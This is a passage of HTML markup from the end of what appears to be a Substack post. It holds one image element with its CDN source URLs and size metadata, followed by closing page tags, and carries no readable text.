src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png" width="1456" height="709" data-attrs="{&#34;src&#34;:&#34;https://substack-post-media.s3.amazonaws.com/public/images/adf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png&#34;,&#34;fullscreen&#34;:null,&#34;imageSize&#34;:null,&#34;height&#34;:709,&#34;width&#34;:1456,&#34;resizeWidth&#34;:null,&#34;bytes&#34;:603956,&#34;alt&#34;:null,&#34;title&#34;:null,&#34;type&#34;:&#34;image/png&#34;,&#34;href&#34;:null,&#34;belowTheFold&#34;:true,&#34;internalRedirect&#34;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fadf0c4e9-b988-4680-a37b-fd458bddbd01_2866x1396.png 1456w" sizes="100vw" loading="lazy"/></picture></div></a></figure></div></div></div></div></article></div></div></div>
  </body>
</html>
